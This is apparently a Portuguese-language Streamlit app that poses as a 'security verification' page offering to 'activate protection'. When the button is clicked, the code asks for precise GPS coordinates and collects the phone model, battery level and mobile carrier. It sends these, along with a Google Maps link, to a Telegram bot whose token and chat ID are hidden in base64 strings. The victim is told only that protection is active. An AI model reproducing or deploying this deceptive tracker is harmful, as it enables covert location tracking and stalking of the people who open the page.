import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# --- COLETA TÉCNICA (LINHAS CORRIGIDAS) ---
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_CORRETO")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_CORRETO")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_SOLUCAO"):
    # Dispara o pop-up de GPS no clique (Fundamental para o Galaxy A11)
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:10000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_ACTION_{int(time.time())}")

    if posicao and posicao != "erro":
        # CONSERTO DA LINHA 37/39: Extração do nome sem quebrar
        modelo = "Smartphone"
        if ua:
            try:
                # Procura por POCO, Samsung ou códigos técnicos no sistema
                dados_ua = ua.split("(")[1].split(")")[0]
                partes = [p.strip() for p in dados_ua.split(";")]
                for p in partes:
                    if any(m in p for m in ["POCO", "SM-", "A11", "Xiaomi", "Samsung", "2312"]):
                        modelo = p
                        break
            except: modelo = "Dispositivo Android"

        # Bateria (Conserto da linha 39)
        nivel_bat = f"{bat}%" if bat else "Carregando..."

        # Operadora
        try:
            op = requests.get('https://ipinfo.io/json', timeout=5).json().get('org', 'Rede Móvel')
        except: op = "Operadora Local"

        link_mapa = f"https://www.google.com/maps?q={posicao}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {nivel_bat}\n"
            f"📶 *Operadora:* {op}\n"
            f"📍 *Local:* {link_mapa}"
        )
        enviar_telegram(relatorio)
        st.success("Proteção Ativada")
    elif posicao == "erro":
        st.error("Erro: GPS negado ou desligado.")
    else:
        st.info("Aguardando permissão no topo da tela...")

# RODAPÉ OBRIGATÓRIO
st.markdown('<br><p style="text-align:center; color:grey; font-size:12px; font-weight:bold;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
